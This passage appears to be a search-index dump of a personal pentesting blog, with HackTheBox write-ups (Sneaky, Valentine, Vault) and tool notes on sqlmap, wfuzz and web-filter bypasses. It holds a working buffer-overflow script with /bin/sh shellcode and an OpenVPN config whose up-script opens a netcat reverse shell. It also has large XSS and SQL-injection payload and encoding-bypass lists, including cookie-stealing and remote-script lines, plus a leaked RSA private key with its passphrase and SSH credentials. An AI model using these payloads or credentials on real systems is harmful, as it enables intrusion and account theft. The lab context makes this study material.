-type f 2\u0026gt;/dev/null  I used NetCat to transfer the binary over. I really suck at Reverse Engineering, i had a guess that gdb would be the go to tool for this. i hate that tool, nothing ever works lol.\nI\u0026rsquo;m going to be talking out of my ass on this part because quite frankly Reverse Engineering terrifies me.\nthrasivoulos@Sneaky:~$ file /usr/local/bin/chal /usr/local/bin/chal: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped  You would think they would keep the same lay out as in ippsec video. maybe he uses the github repo instead of kali repo hmmmm. Anyway\u0026rsquo;s the output\u0026rsquo;s different now slightly less straight forward i think. checksec -f chal this tool maybe deprecated. I tried to the github version same output lame it was way nicer in ippsec video.\nRunning file on the binary reveals it\u0026rsquo;s x32, can\u0026rsquo;t really run it locally. Thats something to remember as well when doing reverse engineering. Running the binary without any arguements produces a segmentation fault.\n​ \u0026ldquo;Segmentation fault\u0026rsquo;s from google say\u0026rsquo;s fairly common they are cause when a program doens\u0026rsquo;t have read or write an illegal memory location. \u0026ldquo;\nthrasivoulos@Sneaky:~$ /usr/local/bin/chal Segmentation fault (core dumped)  load up into gdb r with arguement get the segfault copy that to. then use /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500 to generate characters. then use pattern_offset.rb -q\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq  Take the string and bring it over gdb we could generate the string other ways but this is a nice go to. this should give us a memory address well send that to patern_offset.rb find the buffersize for the memory address. this is pretty cool that these things are the same on different computers. we\u0026rsquo;re pretty lucky this is easy.\nWe get our address after the segment fault.\nBring the memory address over and well use metasploit module to find the offset for the address.\nFAILED THIS DIDN\u0026rsquo;T WORKOUT. start GDB r $(python -c \u0026lsquo;print \u0026ldquo;A\u0026rdquo;*400\u0026rsquo;) this will create a segmentation fault.\nPYTHON writing the buffer over flow code.\n​ We will start out by writing the buffsize then well add the shell code that will call /bin/bash and elevate our session to root. i love this trick with linux system. xD\nhttps://packetstormsecurity.com/files/115010/Linux-x86-execve-bin-sh-Shellcode.html\nthen the code put\u0026rsquo;s everything together so the payload fit\u0026rsquo;s insdie the right place in the buffer overflow. so when we escape out of our memory location our command will get pushed out. something like that.\ni like to think of it like were filling up a up a cup of coffee the foam our code and we fill it up with coffee to elevate the foam. xD there are bunch of good video to work on basic concepts. i know i need to lol\nThere was some final editing i had to do to get it to work. because the memory address was off slightly. I\u0026rsquo;d like to cover that just incase. Running the code we made should produce a segment faul again not what we want. We\u0026rsquo;ll run things slightly different and find a better memory address.\n/usr/local/bin/chal r $(python pinkie.py)  next will examine the hex and see were the nops end and try and locate a better location. I had to scroll down a couple columns of hex to find a better address. ippsec explained that nope should continue down the memory address until it find the correct one so being exactly write isn\u0026rsquo;t necessary hopefully. that\u0026rsquo;s what the arrow is suppose to show.\nx/400x $esp $esp in linux anything that starts with a dollar sign is typically a variable.  change the address in the eip variable in the below script. DON\u0026rsquo;T FOR GET TO INVERT THE MEMORY ADDRESS. (I did lol)\nbuf_size=362 shell_code = \u0026quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\u0026quot; shell_code += \u0026quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\u0026quot; shell_code += \u0026quot;\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\u0026quot; shell_code += \u0026quot;\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\u0026quot;; nop_sled = \u0026quot;\\x90\u0026quot;*(buf_size-len(shell_code)) # essenicially invert the memory address in hex. eip = \u0026quot;\\xb0\\xf7\\xff\\xbf\u0026quot; #0xbffff550 payload = nop_sled + shell_code + eip print payload  Once, the final changes are made move it back over to the remote host. i had to do it remotely vim was bugging out on the remote host. run a slight different command initially you may use gdb.\n/usr/local/bin/chal $(python pinkie.py)  "
},
{
	"uri": "/webapp/sqlmap/sqlmap/",
	"title": "SqlMap",
	"tags": [],
	"description": "",
	"content": "SqlMap automates finding sql-injection it can use GET or POST request. It\u0026rsquo;s pretty neat.\nIn burp right click select copy to file, this will test for sql injection. pretty cool wasn\u0026rsquo;t aware it would test all the parameters. sqlmap \u0026ndash;batch -r login.req\nsqlmap --batch -u \u0026quot;http://os.htb/users/admin*\u0026quot; --level 5 --risk 3 -u url also for get request --batch run default yes --* = the parameter to fuzz --dump , --dump-all dumping sqldb to a localfile in /  "
},
{
	"uri": "/hackthebox/tmux/",
	"title": "TMUX",
	"tags": [],
	"description": "",
	"content": "TMUX\nokay, because my kali linux crash i had to reintall tmux. i really like gpakaosz theme pack for tmux. cd into your home directory, then create a symlink to .tmux.conf so when tmux runs it will look in you\u0026rsquo;re \u0026ldquo;home\u0026rdquo; directory in kali thats ~/ or /root/\napt-get install tmux cd ~/ git clone ln -s .tmux/.tmux.conf -f force cp .tmux/.tmux.conf.local .  "
},
{
	"uri": "/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/linux/tunneling/",
	"title": "Tunnels",
	"tags": [],
	"description": "",
	"content": " SSH PORTFORWARDING\nssh port forwarding will create \u0026ldquo;tunnels\u0026rdquo; allowing access to the network on the host. examples would be using localhost,or a private address.\nssh user@ip_addr -L LocalPort:address_ip:HostPort  SSH BIND PORT\nBind\u0026rsquo;s a port locally on both sides, creating a tunnel to the localhost on the victim. works with socks 4 \u0026amp; 5\nssh -D8080 USER@IPADDRESS  Sshuttle Creates a VPN connection using the SSH protocol; forwarding all traffic to the target\u0026rsquo;s network. It has a lot of options/switches to use but by default, they are set to auto/detect. So typically you won\u0026rsquo;t need most of them.\nDOWNLOAD  Something to note you will need root access to run sshuttle; be sure to test the connection before wildly connecting.\nConnecting to a router with enabled ssh will give you access to th"
},
{
	"uri": "/webapp/user-inputt/",
	"title": "USER INPUT OF DOOM",
	"tags": [],
	"description": "",
	"content": "Talk about Bypass passing WAFS, and other mechanism I will be using \u0026ldquo;Web Application hackers handbook\u0026rdquo; as my guide. We\u0026rsquo;ll break this into six sections broken authentications, broken access controls, sql injection, cross site scripting, information leakage, cross-site request forgery.\nI\u0026rsquo;ve heard good things about this book and figured doing a small writeup on it might be a fun experience.\nBypassing BlackList - Sometimes the blacklist is literal this means it will look for SELECT, and any other iteration of select will be ignored like SelEcT.\n   SELECT SelEct     \u0026lsquo;or \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1 \u0026lsquo;or \u0026lsquo;2\u0026rsquo;=\u0026lsquo;2   alter(\u0026lsquo;xxs\u0026rsquo;) prompt(\u0026lsquo;xss\u0026rsquo;)    In Some cases the BlackList may be more stringent, you can use nonstandard characters between expression. Like Encoding the input url encoded base64 etc. were %09 is used and foo\nSELECT/*foo*/username,password/*foo*/FROM/*foo*/users \u0026lt;img%09onerror=alert(1) src=a\u0026gt;  There are plenty of examples from the hackthebox challenges of changing thing slightly to bypass These blacklist. This can also apply to file upload abilities. I think the most common would have to be file upload extensions. Go to the search bar type in waf, upload. some boxes should come up (mischief, friend zone, ).\nFor example, you are allowed to upload a image to an apache web server. There could be a blacklist denying a bunch of things or a white list only allowing in one thing. Because of how the web server reads the file and how the system reads the file. getting some malicious code on the website can fairly easy if the proper filters aren\u0026rsquo;t in place.\nFILE UPLOAD The website has white listed .png files, only png files can be upload. the operating system will read the last period as the extension. the white list will read the first period.  pinkie.jpg.php is one way commonly used to bypass white list, in beginner ctf.\nThe Null Character %00 is fun to play with but there are other characters like  \u0026amp; ; | . Sometimes characters can be read read literally. I know there are more escape characters than that, metastable is a good example. when you up the difficulty you have to mix up the characters to bypass the filter to get command injection.\nSANITIZED INPUT Another defense websites will use is to the user input and sanitize the input in such away it\u0026rsquo;s no long malicious. The most evil sanitized input ever is in help line where it will replace everything with null.\nOne defense against ccs is to URL -ENCODE dangerous characters before they are embbed. if it is running some kind exec you could tell it to decode the string xD. You may also Double Encode the payload, i believe something like this was used in crime stoppers.\nSQL INJECTION OF DOOM\nSo, really i would like to give something fancy here but there isn\u0026rsquo;t anything fancy to say if you get a server error form entering in the basics you have the beginning of sql injection. i often exaggeration sql there are allot of parameters but using the basic open source tools we have in kali is all we need to enumerate sql. while the scanners run do some manual testing.\nSo, Using time delay\u0026rsquo;s is a fancy and easy way to look for sql injection. It can be exceptionally useful during finding blind sql injection the results aren\u0026rsquo;t returned. This is where the time delays technique shines, it can also be useful in other ways like where standard techniques fail supplying crafted input.\n```\u0026amp;#39;; wait delay \u0026amp;#39;0:30:0\u0026amp;#39;\u0026ndash; \u0026lsquo;; waitfor delay \u0026lsquo;0:30:0\u0026rsquo;\u0026ndash; 1; waitfor delay \u0026lsquo;0:30:0\u0026rsquo;\u0026ndash;\n **XSS CROSS SITE SCRIPTING** Cross Site Scripting, is a pretty common bug, its also known as html injections. This kind of attack allows Bad guys to injection malicious html into a website without compromising the webserver to inject the malicious code. Typically statically generated sites aren't vulnerable. Dynamic sites where they take user input and generate content for the user supplied input. will have the best affect. Sometims the site \u0026lt;mark\u0026gt; \u0026gt; \u0026lt;/mark\u0026gt; will filter out the wacka sign. Try encoding \u0026lt;mark\u0026gt; \u0026gt; \u0026lt;/mark\u0026gt; to bypass the filters.  alert(123) alert(\"XSS\");// \\\";alert('XSS');// http://m.com/index.php?user=alert(123) http://m.com/index.php?user=alert(document.domain) ``` ``` %3c \\x3e  %3cscript%3ealert(document.domain)%3cscript%3e \\x3cscript\\x3ealert(document.domain)\\x3cscript\\x3e ``` *TESTING* https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec ``` alert(document.cookie) \u0026quot;alert(document.cookie) \u0026quot;%3e%3cscript%3ealert(document.cookie)%3c/script%3e \u0026quot;iptalert(document.cookie)ipt %00“alert(-document.cookie)\" class=\"bbCodeImage wysiwygImage\" alt=\"\" unselectable=\"on\" alert(123) alert(document.domain) \u0026quot; \" alt=\"[IMG]\" unselectable=\"on\" ``` ``` alert(123) \"alert(document.domain) \" alert(\"XSS\");// Escaping jarascript escapes \\\";alert('XSS');// Encoding url, little eindian  \\x3cscript src=http://www.example.com/malicious-code.js\\x3e\\x3c/script\\x3e %3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e Body a 8 \" onmouseover=alert(1) \" \" IMG HREF alert(8007)\"Click Me meow alert(document.domain) \"http://example.com/index.php?user=alert(123)  http://example.com/index.php?user=alert(document.domain) http://example.com/index.php?user=\\\";alert('XSS');// http://example.com/index.php?user=%3cscript%3ealert(123)%3e%3c/script%3e http://mdsec.net/error/5/Error.ashx?message=alert(1) article.php?title=\nhttp://alert(123) alert(document.domain) \u0026ldquo;\u0026gt; IMG HREF alert(8007)\u0026ldquo;\u0026gt;Click Me meow alert(document.domain) \u0026ldquo;\u0026gt;http://example.com/index.php?user=alert(123) http://example.com/index.php?user=alert(123) http://example.com/index.php?user=\u0026quot;;alert('XSS');// http://example.com/index.php?user=%3cscript%3ealert(123)%3e%3c/script%3e http://mdsec.net/error/5/Error.ashx?message=alert(1) article.php?title=\n  \u0026rdquo;\u0026gt;alert(document.cookie)\u0026ldquo;\u0026gt;alert(document.cookie) \u0026ldquo;%3e%3cscript%3ealert(document.cookie)%3c/script%3e \u0026ldquo;\u0026gt;ipt\u0026gt;alert(document.cookie)ipt\u0026gt; %00\u0026rdquo;\u0026gt;alert(document.cookie)\n input is inserted into quotes =D \u0026lt; \u0026quot;userinput\u0026quot;\u0026gt; sometimes it happens more than youd think.  \u0026rdquo;; alert(document.domain); var foo= javascript:alert(1); #\u0026ldquo;onclick=\u0026ldquo;javascript:alert(document.domain)\n tag attributes  \u0026gt;alert(document.domain) \u0026ldquo;\u0026rdquo; onfocus=\u0026ldquo;alert(document.domain)\n Javascript  var a = \u0026lsquo;myxsstestdmqlwp\u0026rsquo;; var b = 123; \u0026hellip;  \u0026ldquo;; alert(1); var foo=’\n HTML  alert(document.domain);\nalert[1];\n IMAGES some times naming a file like this or image can achieve xss elsewhere on the site.  \u0026rdquo;\u0026gt;.jpg \u0026ldquo;\u0026gt;.jpg \u0026ldquo;\u0026gt;.png\n **#### TESTING #### **   Welcome Hialert(123) \n **##WORDPRESS##** https://www.exploit-db.com/exploits/36844  \n param url testing  /?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4= /?param=javascript:alert(document.cookie)\n Vulnerable code might look like **###Bug Bounties Examples###** http redirect xss Able to achieve xss by taking advantage of the url redirect and entered some javascript into it nd got xss.  url.com/login?next=javascript:alert(document.domain)\n ![url-xss](/home/pwny_sec/Documents/Hugo/sites/blog/static/images/user-input/url-xss.png)  Take this URL: https://app.mopub.com/login?next=https://google.com Change \u0026quot;https://google.com\u0026quot; to whatever URL you want to redirect to. Visit the URL and login You will be redirected to that site   **XML** Breaking the command up into segments javascript  javascript: Markdown xss\n ![xss-xml](/home/pwny_sec/Documents/Hugo/sites/blog/static/images/user-input/xss-xml.png)  POC URL 1:\nhttps://app.shopify.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31\u0026amp;google_apps_uri=javascript:prompt(document.domain)\u0026amp;return_to=https%3A%2F%2Fapp.shopify.com%2Fservices%2Flogin%2Fidentity_callback%3Fshop_name%3D123ashketchum%26state%3D6a_2K0iBEBMG3sv07qFMrtzfrBFY4gZ9JsN0EJAW2Xck07xlkghl0tmZwGIvYEZ1KZw2mG4d4Omhl_h5oB_7t4dcXoS37UUOMG6f9sOr7BCKyR23PWbLpVlh4A0lMXmNuxOEUeEA55eapNpVZqT6AyfnJkQhn4K89-I5O6TVqcamtHaXWRH7b1EI6U8LvQFddrBPYniYGpggAwsFLvb5UeTvRw-fbvRditQ20YWYTK8%253D\u0026amp;ui_locales=en\u0026amp;upgradeable=true\u0026amp;ux=shop POC URL 2:\nhttps://app.shopify.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31\u0026amp;google_apps_uri=javascript:prompt(document.cookie)\u0026amp;return_to=https%3A%2F%2Fapp.shopify.com%2Fservices%2Flogin%2Fidentity_callback%3Fshop_name%3D123ashketchum%26state%3D6a_2K0iBEBMG3sv07qFMrtzfrBFY4gZ9JsN0EJAW2Xck07xlkghl0tmZwGIvYEZ1KZw2mG4d4Omhl_h5oB_7t4dcXoS37UUOMG6f9sOr7BCKyR23PWbLpVlh4A0lMXmNuxOEUeEA55eapNpVZqT6AyfnJkQhn4K89-I5O6TVqcamtHaXWRH7b1EI6U8LvQFddrBPYniYGpggAwsFLvb5UeTvRw-fbvRditQ20YWYTK8%253D\u0026amp;ui_locales=en\u0026amp;upgradeable=true\u0026amp;ux=shop\n **####** Sometimes evading restrictions on \u0026lt; or bracket can be troublesome.  \u0026lt; %3C \u0026amp;lt \u0026lt; \u0026amp;LT \u0026LT; \u0026amp;#60 \u0026amp;#060 \u0026amp;#0060 \u0026amp;#00060 \u0026amp;#000060 \u0026amp;#0000060 \u0026#60; \u0026#060; \u0026#0060; \u0026#00060; \u0026#000060; \u0026#0000060; \u0026amp;#x3c \u0026amp;#x03c \u0026amp;#x003c \u0026amp;#x0003c \u0026amp;#x00003c \u0026amp;#x000003c \u0026#x3c; \u0026#x03c; \u0026#x003c; \u0026#x0003c; \u0026#x00003c; \u0026#x000003c; \u0026amp;#X3c \u0026amp;#X03c \u0026amp;#X003c \u0026amp;#X0003c \u0026amp;#X00003c \u0026amp;#X000003c \u0026#X3c; \u0026#X03c; \u0026#X003c; \u0026#X0003c; \u0026#X00003c; \u0026#X000003c; \u0026amp;#x3C \u0026amp;#x03C \u0026amp;#x003C \u0026amp;#x0003C \u0026amp;#x00003C \u0026amp;#x000003C \u0026#x3C; \u0026#x03C; \u0026#x003C; \u0026#x0003C; \u0026#x00003C; \u0026#x000003C; \u0026amp;#X3C \u0026amp;#X03C \u0026amp;#X003C \u0026amp;#X0003C \u0026amp;#X00003C \u0026amp;#X000003C \u0026#X3C; \u0026#X03C; \u0026#X003C; \u0026#X0003C; \u0026#X00003C; \u0026#X000003C; \\x3c \\x3C \\u003c \\u003C ```\n**###HTTP REDIRECT###\n########### WARNING ########### DO NOT USES THESE ON ANYONE\npayloads\nhttps://github.com/cujanovic/Markdown-XSS-Payloads\nhttps://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt\n"
},
{
	"uri": "/hackthebox/boxes/valentine/",
	"title": "Valentine",
	"tags": [],
	"description": "",
	"content": "I lost my original notes. VM corrupted.\nPHASE 1 — NMAP\nnmap -sC -sV -Pn -oA initial 10.10.10.79  Didn’t return anything of significance. https is odd for a hackthebox challenge. Port 22 could be the initial foothold. Google apache 2.2.22 https vulns nothing crazy pops out.\nPHASE 2 — GOBUSTER /wpscan\ngobuster -u [http://10.10.10.](http://10.10.10.88)79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-mediuml.txt -t 50  return vulnerable to OpenSSL hearbleed\nPHASE 3 Manual investigation of the webpage\nThe big give away. A heart bleeding, hmm.\nBELIEVE THE HYPE. It’s also a hint to the exploit.\nPHASE 4\nWpscan returned Heartbleed vulnerability.\nYou may also run the exploit through Metasploit.\nmsfconsole\nsearch bleed use auxiliary/scanner/ssl/openssl_heartbleed set RHOSTS 10.10.10.79 set ACTION KEYS exploit  -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEAwygXrPgZKkHSij/OeRwZ9PtI+tMvM2tvyJz5o78ZZqihjfki Yg7hnkVQH1kvrLqVz68jqlTJZEAPJajF3cvEHIcM0nMSLnd2z4lI+zlK4fU9QMO1 moJo9o2Msk0/TwMJwLqtdF1TZLBXakQPH7f2+wWIrrLByt6m+8Vmd0YpdWDQr5Hd WTA6C4+FIeVdyCIcVup6Lw0nXOKn1i5VRheHItUbZmIlhfoJHDhtGxSeqXrgMU1D Js6wkebQm0jYz095+a8SRNRl5P93R1aFTTvprdtN6y0pl/hampnDrRcabHOkBB/l 1Y6ox6YgrorgULjxstJI3n2ziQ226G3Ho4JelwIDAQABAoIBAQCWkqd5wE6CSRjt q/9deC4a04riY/CmJr2vtlXyXi52A6Pqi49YwwyW9fm0xjY/ehK+k+3brOFZ5QcK 0mYgE+iy7gwZj8k2atwTkmPp2bGKF5J0FsxWc0oS+PHWXD19c+Wheyb7gkomhNxd VDerDGCWGxXzXF6jbRi/ZvYBDvRL59YOvXmdQa3MKykGywUn+NFZvUxICyEma24K 5ABMIWm5cTmDzm5Cd5/wn5Pu4tY0TIzfoa3KnA+M8vpmd4xgRGWGpatFKrM3LqSq W0+Rr81Ty/R7lr1DkLDKp1ltvCl3pp1Lkoo3Ublk38C6gHHS3Vfs6h+QJfNgjeQu RyKqm3H5AoGBAPFMTE9WpalFjB0u+hHNbFRfRet8480wa5702AEDK/cHi0U+R9Z0 Va/qm7PtzBP/m4nUXJwZbvG9O2PKXusGmgIBc/jqSQpQriIvBb27AJiq65Jd7tJ4 AiNZm6v/bFChFmWhdZe1S4vBgnlYoRWHsu+3JJpMJFKZYYl9O/X8ZWdtAoGBAM8M F8KO2EtVQUrosnZQfn+2pLbY4n4Q66N3QaBeoqY7UipBJ1r3jIfupiw5+M1gEXvB gnQmRLwRAA7Wmsh0/eCxeOk7kgNr7W8nNdxwp0Uv06h1CtEqvFIuXab5pYG5/QKs habSXxY02QuaVgM/vXBTSOO0TC/7Rm6ORJzAxAeTAoGBAOakinBvnwuMmaAvjgJE O57uLlQoXUp9VPFskaduE7EdOecm393B90GeW9QBoccf1NlK7naa7OwOd90ry8yU 09LE9shfkQ9WDQxJrBAt1iUXgvK17Jiq80g818rw6+SqBVGBongvZ5WfkwpQSDDf M49knI0L6NA3If8cgJrg9UCFAoGBAK1DJmL23MP13UTNhAKEi8deVWp6BteOW1KZ Cr8kUqIfRDv99+wk+mIKcN7TyIQ9H4RbxEpkd+KVq2G/bxnO5WFxwogTBLZ+S9xX iLgnQaMhSdNP1rSBOcTf7hk8EqeDt9nT+6hFpbLUmMkf51iir2nfGEEM8TC56w+7 WGmA2sqnAoGAUyztn0Sc08xny1oGQXjVcVy/KsszYNfaF2y4i6tsbDsD2HfzRvbp zeSeXxopyjjMTKCIMONh88JFeJoctmsLg2eG3uFw5c+wvD+GBafFfufvf2Xz183h 05q+RVlBncSiUayk33RtWi0Csl9L3prrGKh9RLUBmkSZ/E90ATxE92w= -----END RSA PRIVATE KEY-----  Buahahahahaha, we have the ssh RSA key. Truly we are master of the universe.\nwithout Metasploit; some crap the server leaked.\nPHASE 6 SSH\nSince we have the private keys and the ssh server has the public key all we need is the username. Based on the webpage hints my guess was it was\nhype\n create a file named private-key \u0026amp; change the permissions to 600.\nvi private-key in vim tpye :set paste then paste crlt-v chmod 600 private-key ssh -i private-key hype@valentine.htb  Snap we will need the passphrase for for the private key.\ngo back to msfconsole and change the action to dump. Note you might need to repeat this a couple of times to find base64 encoded string.\nset action DUMP  Metasploit stores the data in .msf4/loot/somefile\necho \u0026quot;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==\u0026quot; \u0026gt; string.b64 base64 -d strting.b64 heartbleedbelievethehype  ssh -i private-key hype@10.10.10.79\npassphrase = heartbleedbelievethehype\nHmm the key I found with metasploit doens\u0026rsquo;t work but there is a private-key, I found earlier. repeat the steps from earlier and use the passphrase from the Metasploit memory dump .\n We’re inside lets transfer over LinEnum. LinEnum is a script that automates enumerating the system. Python server is a neat way to move files around between systems.\nhttps://github.com/rebootuser/LinEnum.git\nHOSTING FILES go to directory where desired file is run command below, it will host the directory python3 -m http.server 8081 go to browser http://localhost:[port]/[DirectoryName] note: i had to clear the firefox cache wget http://10.10.14.7:4488/home/  haha that’s it folks\nA few lessons can be learned from this box beside updating the web server. Make sure system tools are properly secured. Make sure no level users can access bash-history. Be careful using setuid.\nTmux isn’t always vulnerable but it can be when we can link it to a file/folder with the need permissions. Tmux has the ability to link its self to a file or folders group permissions. Ill talk about file permissions later. what a suid binary is.\nnote : watch ippsec video on the box\nA better way to scan for vulns:\nnmap -sV -p 445 — script safe -Pn -n -oA NmapScripts 10.10.10.97  "
},
{
	"uri": "/hackthebox/boxes/vault/",
	"title": "Vault",
	"tags": [],
	"description": "",
	"content": " Vault Nmap showed some ephemeral ports, ssh, HTTP. Gobuster didn’t initially show anything. Tried wfuzz to check for possible subdomains nothing.\nmoving on to the webpage slowdaddy webpage haaha. talks about how the webpage is under construction in the first client is sparklays. which is a real jewelry company. Gobuster was tricky append sparklays to url, and use txt,html,php extentions. I used the seclist to find the directory.\nso it turns out its not sql injections pretty happy with that. Using gobuster found changelogo directory and uploads.\nsparklays/design/design http://vault.htb/sparklays/design/changelogo.php http://vault.htb/sparklays/design/uploads  this will give us the ability to upload a php-reverse shell. there is a filter or a waf blocking some common extensions. using php5 as the extension bypassed the restrictions. to run the reverse shell we need to access at uploads\nhttp://vault.htb/sparklays/design/uploads/rshell.php5  once inside you\u0026rsquo;ll notice key, server, ssh files in the Desktop directory. the key is for later.\nServers output ### DNS + Configurator - 192.168.122.4 Firewall - 192.168.122.5 The Vault - x ### ssh ### dave Dav3therav3123 ### ENUMERATING WITH NETCAT for loop to scan an ip range for i in {1..254}; do nc -v -n -z -w 1 192.168.122.$i 22; done simpler version Enumerate a port range nc -zv -w 1 192.168.122.4 1-1000 2\u0026gt;\u0026amp;1 | grep succeeded!  next use netcat to scan DNS server found 22 \u0026amp; 80.\nSSHUTTLE\nsshuttle will forward 10.10.10.109 to 192.168.122.0/24 allowing us to access the webpage. going to vpn configure were allowed to edit the vpn.conf file. quick google search reverses shell vpn.conf file. lead me to this https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da\nremote 192.168.1.245 ifconfig 10.200.0.2 10.200.0.1 dev tun script-security 2 up “/bin/bash -c ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.122.1 9056 \u0026gt;/tmp/f’” nobind  For whatever reason editing remote or ifconfig does affect whether it\u0026rsquo;ll works or not. setup a netcat listener get ready for the shell. This took a while to figure out. Once inside DNS some more ssh files user.txt. This part was pretty hard because there\u0026rsquo;s nothing to exploit don’t really see anything. when I first did the box I found someone else\u0026rsquo;s junk laying around. DNS has nmap on it so scan for available IP. after running nmap 192.168.0.0/16\nWell, gosh darn it (internally rages)I got access by skipping a very important part. no fault to my own. So now im going to build a variety of ways to detect this in the future.\nnmap is available performing a very verbose scan of 192.168.5.0 ip range descover another ip address. You can also you netcat to do that scan.\nnmap -Pn -vvv -sV 192.168.5.0/28 -T5 used a smaller iprange for time.  Note this assumes that one port is predominantly open in the environment to scan. ONE LINER: for i in {1..29}; do nc -v -n -z -w 1 192.168.5.$i 53 |grep failed; done SMALL SCRIPT for ip in $(seq 1 1000); do nc -zv -w 1 192.168.5.2 $ip 53 2\u0026gt;\u0026amp;1 \u0026gt; /tmp/nul | grep -v 'timed' \u0026amp; done  after we verified that 192.168.5.2 is the next target.\nBypassing firewalls\ni suspect the firewall rules look similar to the image below explicitly blocking 192.168.5.1 from accessing port 987. that\u0026rsquo;s why none of the enumeration techniques worked. dhclient -r doesn\u0026rsquo;t reset the IP address.\nDeleting the default gateway address and changing the IP address will bypass the firewall. The IP address in the environment is static, theirs no DHCP to keep track of what mac was assigned an IP address. What is a routing table inside Linux? When there no DHCP or central authority for routing tables operating systems have a habit of trying to understand the environment around them. Every time a connection is made the operating system updates the routing table with the shortest path possible. I think this speaks more to a poorly setup vault. There are actually two paths to vault not one. The route table is configured to send all the traffic to the gateway at 192.168.122.5 there are no controls in place to keep track of everything. Deleting the route to the firewall and changing our IP address will bypass the firewall. If this was configured a little better I also suspect the network is a ring; this trick wouldn’t happen.\nroute\nSo netstat is deprecated, waa ….yep you heard right its trash. the route is the new and shiny Ferrari. Ifconfig is also garbage IP is the cmd line of the future.\nsudo ip addr add 192.168.5.123/24 dev ens3 sudo route del -net 192.168.5.0/24 gw 192.168.122.5   now after all this you can use nmap to scan for the filtered ssh port.\nnmap -sT -Pn 192.168.5.2 -sT is the tcp connections switch apposed to probing with ping  netcat nc -zv -w 1 192.168.5.2 987 2\u0026gt;\u0026amp;1 | grep succeeded!  lastly, gpg is common encryption storing the token ring on the system. so moving it off and trying to decrypt it can be quite the challenges. I used netcat to move the root.txt to 192.168.122.1. the passphrase is itscominghome.\ngpg -d /tmp/test.txt.gpg  "
},
{
	"uri": "/webapp/wfuzz/",
	"title": "WFuzz",
	"tags": [],
	"description": "",
	"content": " WFUZZ WFUZZ is a powerful fuzzer, you can enumerate directories, Wierd directories. You can also use it for bruteforcing passwords, look for Lfi, I could keep going. This is a swiss army knife it doesn\u0026rsquo;t beat manual enumeration. Becoming dependent on this tool to look for SQL injection can lead you to miss something obvious.\nwfuzz -c -w -d \u0026quot;password=FUZZ\u0026quot; -u \u0026quot;http://IP_ADDRESS\u0026quot; --hh 474 -t 42 -c Output text with colors nice feature. -w wordlist -d Post-Data request -u url --hh hide response chars length -t threads #################################### wfuzz -c -b 'PHPSESSID=RepLAceME' -w '/the dictionary' -d 'http://Subscribe/to/ippsec.php?FUZZ=/etc/passwd' -d post-data --hh hide responses with a n(1,2,4,22) character length -b Cookie or the php session id -w Dictionary WordList what have you https://github.com/danielmiessler/SecLists by defaul the last part is always the url or target you can uses the -u url -H header FUZZ.hackthebox.htb used to enumerate subdomains /Seclist/Discovery/DNS/subdomains-top1mil-5000.txt ####################### SUBDOMAIN FUZZING wfuzz -c -f sub-fighter -w /wordlist/seclist/Deiscovery/DNS/subdomains-top1mil-5000.txt -u \u0026quot;http://chaos.htb\u0026quot; -H \u0026quot;Host: FUZZ.chaos.htb\u0026quot; -t 42 --hl 1 -H this is important for fuzzing the sub-domain -f save output to file. ######################## wfuzz -c -b 'PHPSESSID=RepLAceME' -w '/the dictionary' -u 'http://Subscribe/to/ippsec.php?action=FUZZ' this method different than the above. this uses get request or a stanard request. -d is for post.for this one action is replaceable with any php action info file action. -c add colour -b session id you mgiht need it -w word dictionary -u url  Post-Request this one slightly different than above post request one this uses ipv6 from the mischief box. second the formatting is slightly different.\nwfuzz -c -w /opt/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -d \u0026ldquo;FUZZ=junk\u0026rdquo; \u0026ndash;hh 403 \u0026lsquo;http://loki.htb/'\n"
},
{
	"uri": "/hackthebox/boxes/waldo/",
	"title": "Waldo",
	"tags": [],
	"description": "",
